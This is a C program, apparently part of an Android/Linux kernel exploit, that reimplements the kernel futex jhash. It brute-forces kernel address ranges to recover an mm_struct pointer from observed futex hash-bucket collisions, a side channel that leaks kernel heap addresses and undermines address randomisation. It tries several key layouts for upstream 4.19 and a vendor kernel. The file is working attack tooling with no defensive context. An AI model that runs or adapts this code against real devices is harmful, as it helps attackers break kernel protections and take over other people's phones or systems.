#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define rol32(x, n) (((x) << ((n) & 31)) | ((x) >> (((-(n))) & 31)))

static void jhash_mix(uint32_t *a, uint32_t *b, uint32_t *c) {
  *a -= *c; *a ^= rol32(*c, 4);  *c += *b;
  *b -= *a; *b ^= rol32(*a, 6);  *a += *c;
  *c -= *b; *c ^= rol32(*a, 8);  *b += *a;
  *a -= *c; *a ^= rol32(*c, 16); *c += *b;
  *b -= *a; *b ^= rol32(*a, 19); *a += *c;
  *c -= *b; *c ^= rol32(*b, 4);  *b += *a;
}

static void jhash_final(uint32_t *a, uint32_t *b, uint32_t *c) {
  *c ^= *b; *c -= rol32(*b, 14);
  *a ^= *c; *a -= rol32(*c, 11);
  *b ^= *a; *b -= rol32(*a, 25);
  *c ^= *a; *c -= rol32(*c, 16);
  *a ^= *b; *a -= rol32(*b, 4);
  *b ^= *c; *b -= rol32(*c, 14);
  *c ^= *a; *c -= rol32(*a, 24);
}

static uint32_t jhash_variant(const uint32_t *k, uint32_t initval,
                              size_t variant) {
  uint32_t a, b, c;
  a = b = c = 0xdeadbeef;
  if (variant != 2) {
    a = b = c = 0xdeadbeef + (4u << 2);
  }
  a = b = c = a + initval;
  if (variant == 1) {
    a += k[2]; b += k[3]; c += k[0];
  } else {
    a += k[0]; b += k[1]; c += k[2];
  }
  jhash_mix(&a, &b, &c);
  if (variant == 1) {
    a += k[1];
  } else {
    a += k[3];
  }
  jhash_final(&a, &b, &c);
  return variant == 3 ? a : c;
}

static uint32_t futex_hash(size_t addr, size_t mm, size_t variant,
                           uint32_t mask) {
  uint32_t w[4];
  uint32_t page = (uint32_t)(addr & ~0xfffULL);
  uint32_t off = (uint32_t)(addr & 0xfffULL);
  if (variant == 1 || variant == 3) {
    /* Vendor-kernel/layout hypothesis: both.word aliases mm. */
    w[0] = (uint32_t)mm;
    w[1] = (uint32_t)(mm >> 32);
    w[2] = page;
    w[3] = (uint32_t)((addr & ~0xfffULL) >> 32);
  } else {
    /* Upstream 4.19 declaration: both.word aliases private.address. */
    w[0] = page;
    w[1] = (uint32_t)((addr & ~0xfffULL) >> 32);
    w[2] = (uint32_t)mm;
    w[3] = (uint32_t)(mm >> 32);
  }
  /* The alioth vendor source reverses private.mm/address, but still uses the
   * ordinary 4-word jhash2 algorithm.  Keep the algorithm fixed and use the
   * variant parameter only for the key-layout hypothesis. */
  return jhash_variant(w, off, 2) & mask;
}

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s collisions.txt [start] [end] [step] [mask]\n",
            argv[0]);
    return 2;
  }

  size_t addrs[64];
  size_t count = 0;
  FILE *f = fopen(argv[1], "r");
  if (!f) {
    perror("open collisions");
    return 1;
  }
  char line[256];
  while (fgets(line, sizeof(line), f) && count < 64) {
    if (!strncmp(line, "futex_addr=", 11)) {
      addrs[count++] = strtoull(line + 11, NULL, 0);
    }
  }
  fclose(f);
  if (count < 2) {
    fprintf(stderr, "no futex addresses\n");
    return 1;
  }

  size_t start = 0xffffffc000000000ULL;
  size_t end = 0xffffffc200000000ULL;
  size_t step = 0x340;
  uint32_t mask = 2047;
  if (argc > 2) start = strtoull(argv[2], NULL, 0);
  if (argc > 3) end = strtoull(argv[3], NULL, 0);
  if (argc > 4) step = strtoull(argv[4], NULL, 0);
  if (argc > 5) mask = (uint32_t)strtoul(argv[5], NULL, 0);
  if (!step || end <= start) return 1;

  int found = 0;
  size_t best_agree = 0;
  uint64_t best_mm = 0;
  uint32_t best_bucket = 0;
  for (size_t variant = 0; variant < 4; ++variant) {
    fprintf(stderr, "variant=%zu scan=%016zx-%016zx step=%zx mask=%u\n",
            variant, start, end, step, mask);
    for (size_t mm = start; mm < end; mm += step) {
      uint32_t counts[2048];
      memset(counts, 0, sizeof(counts));
      for (size_t i = 0; i < count; ++i)
        counts[futex_hash(addrs[i], mm, variant, mask)]++;
      for (uint32_t b = 0; b < 2048; ++b) {
        if (counts[b] > best_agree) {
          best_agree = counts[b];
          best_mm = mm;
          best_bucket = b;
        }
      }
      uint32_t h = futex_hash(addrs[0], mm, variant, mask);
      size_t agree = 0;
      for (size_t i = 1; i < count; ++i) {
        if (futex_hash(addrs[i], mm, variant, mask) == h) agree++;
      }
      if (agree == count - 1) {
        printf("MM=0x%016zx VARIANT=%zu AGREE=%zu/%zu\n",
               mm, variant, agree + 1, count);
        ++found;
      }
    }
  }
  fprintf(stderr,
          "BEST=MM=0x%016zx BUCKET=%u AGREE=%zu/%zu\n",
          best_mm, best_bucket, best_agree, count);
  return found ? 0 : 3;
}
